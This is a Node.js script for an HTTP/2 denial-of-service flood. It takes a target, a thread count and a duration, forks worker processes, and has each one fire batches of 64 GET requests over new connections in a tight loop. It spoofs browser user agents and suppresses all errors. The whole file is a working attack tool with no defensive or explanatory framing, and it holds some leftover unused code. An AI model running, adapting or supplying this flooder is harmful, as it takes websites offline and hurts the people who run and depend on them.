const fs = require('fs');
const url = require('url');
const http2 = require('http2');
const cluster = require('cluster');

if (process.argv.length <= 3) {
    console.log(` [ HOST ] [ THREAD ] [ TIME ]`);
    process.exit(-1);
}

var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var threads = process.argv[3];
var time = process.argv[4];
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (e) {});
process.on('unhandledRejection', function (e) {});

let userAgents = [];
userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');

const nullHexs = [
    "\x00",
    "\xFF",
    "\xC2",
    "\xA0",
    "\x82",
    "\x56",
    "\x87",
    "\x88",
    "\x27",
    "\x31",
    "\x18",
    "\x42",
    "\x17",
    "\x90",
    "\x14",
    "\x82",
    "\x18",
    "\x26",
    "\x61",
    "\x04",
    "\x05",
    "\xac",
    "\x02",
    "\x50",
    "\x84",
    "\x78"
];

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    console.log(` ATTACK SENT !! `);
    setTimeout(() => {
        process.exit(1);
    }, time * 1000);
} else {
    startflood();
}

function startflood() {
    var int = setInterval(() => {
        const client = http2.connect(target);

        for (var i = 0; i < 64; i++) {
            const headers = {
                [http2.constants.HTTP2_HEADER_PATH]: '/',
                [http2.constants.HTTP2_HEADER_METHOD]: 'GET',
                'Host': parsed.host,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                'User-Agent': generateStrongUserAgent(),
                'Upgrade-Insecure-Requests': '1',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Connection': 'Keep-Alive',
            };

            const reflectProbability = 0.5; // Adjust this probability as needed
            const delayTime = 120000; // Adjust this delay time as needed (2 minutes)

            const options = {
                method: 'GET',
                headers: headers,
            };

            const req = client.request(options);

            req.on('response', (headers) => {
                // Handle response headers
            });

            req.on('data', (chunk) => {
                // Handle response data
            });

            req.on('end', () => {
                // Handle end of response
                setTimeout(() => {
                    client.close();
                }, 5000);
            });

            req.end();

            setTimeout(() => {
                // Continue with the rest of the code after the delay
            }, delayTime);
        }
    });

    setTimeout(() => {
        clearInterval(int);
    }, time * 1000);
}

function generateStrongUserAgent() {
    const strongUserAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0.2'
    ];

    return strongUserAgents[Math.floor(Math.random() * strongUserAgents.length)];
}
